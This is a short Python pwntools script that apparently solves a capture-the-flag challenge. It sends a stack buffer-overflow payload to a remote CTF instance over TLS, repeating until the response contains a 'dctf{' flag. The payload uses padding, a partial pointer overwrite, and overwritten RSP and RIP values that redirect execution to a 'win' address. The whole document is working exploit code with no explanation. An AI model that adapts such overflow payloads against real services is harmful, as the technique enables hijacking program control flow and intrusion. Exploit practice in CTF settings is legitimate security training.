from pwn import *

#p = process("./app")
#p = gdb.debug("./app", gdbscript="""
#    b * main
#    b * command_reader+71
#	b * win
#	c
#	""")
#p = remote("localhost", 1337)
for i in range(64):
    print(f"Round {i}")
    p = remote("inst-jmtthpx3t3.tls.vuln.si", 443, ssl=True)

    win = 0x40117d

    nextstack = 0x60
#nextstack = int(input("Leak:"), 16) + 0x10
    rsp = 0x407800

    payload = b"A" * 8*3 # Buffer
    payload += b"\xe8" # Move to next byte in cmd ptr
    payload += nextstack.to_bytes(1, "little") # Set second byte near the next stack
    payload += b"B" * 6 # Padding
    payload += b"C" * 48 # Buffer 2
    payload += p64(rsp) # RSP
    payload += p64(win) # RIP
    p.sendline(payload)

    data = p.recvall()
    if b"dctf{" in data:
        print(data)
        break
